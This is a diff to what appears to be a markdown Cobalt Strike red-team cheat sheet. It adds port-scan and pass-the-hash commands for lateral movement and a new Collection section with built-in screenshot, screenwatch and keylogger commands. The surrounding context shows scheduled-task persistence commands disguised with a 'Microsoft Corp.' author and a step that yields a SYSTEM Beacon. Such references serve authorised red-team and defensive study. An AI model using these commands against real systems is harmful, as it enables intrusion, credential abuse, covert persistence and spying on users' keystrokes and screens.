@@ -12,6 +12,7 @@
 - [Exfiltration - Password Attacks](#exfiltration---password-attacks)
 - [Exfiltration - Email](#exfiltration---email)
 - [Persistence](#persistence)
+- [Collection](#collection)
 - [Cobalt Strike BOFs](#cobalt-strike-bofs)
 - [References](#references)
 
@@ -236,6 +237,20 @@ run schtasks /run /tn "TaskName" --> Should pop SYSTEM Beacon
 
 ------------------------------------------------------------------------------------------
 ## Lateral Movement
+
+Cobalt Strike port scan
+```
+portscan [IP/range] [ports]
+portscan 10.10.10.0/24 22,25,80-443,5985-5986
+```
+
+Pass-the-hash
+```
+pth [DOMAIN\user] [hash]
+pth LocalAdmin HASH
+pth DOMAIN\User HASH
+```
+
 Cobalt Strike jumping (OUTDATED)
 ```
 # Jump using WinRM if it's enabled for the current user on the target system
@@ -712,7 +727,8 @@ powershell Get-GlobalAddressList -ExchHostname ExchangeHost.domain.com -UserName
 ```
 ------------------------------------------------------------------------------------------
 ## Persistence
-[SharpStay](https://github.com/0xthirteen/SharpStay) - .NET Persistence
+
+### [SharpStay](https://github.com/0xthirteen/SharpStay) - .NET Persistence
 ```
 # Scheduled task persistence
 execute-assembly C:\Sharpstay.exe action=ScheduledTask taskname=TestTask command="C:\windows\temp\file.exe" runasuser=testuser triggertype=logon author=Microsoft Corp. description="Test Task" logonuser=testuser
@@ -744,6 +760,23 @@ execute-assembly C:\SharPersist.exe -t service -c "C:\Windows\System32\cmd.exe" 
 ```
 
 [StayKit](https://github.com/0xthirteen/StayKit) - Cobalt Strike persistence kit aggressor script
+
+-----------------------------------------------------------------------------------------
+## Collection
+
+### Screenshot BOFs built-in
+View screenshots in '_View -> Screenshots_'
+```
+# Take a single screenshot
+screenshot
+
+# Continuously take screenshots
+screenwatch
+```
+
+### Keylogger BOF built-in
+View output keystrokes in console or '_View -> Keystrokes_'
+`keylogger`
 
 ------------------------------------------------------------------------------------------
 # Cobalt Strike BOFs
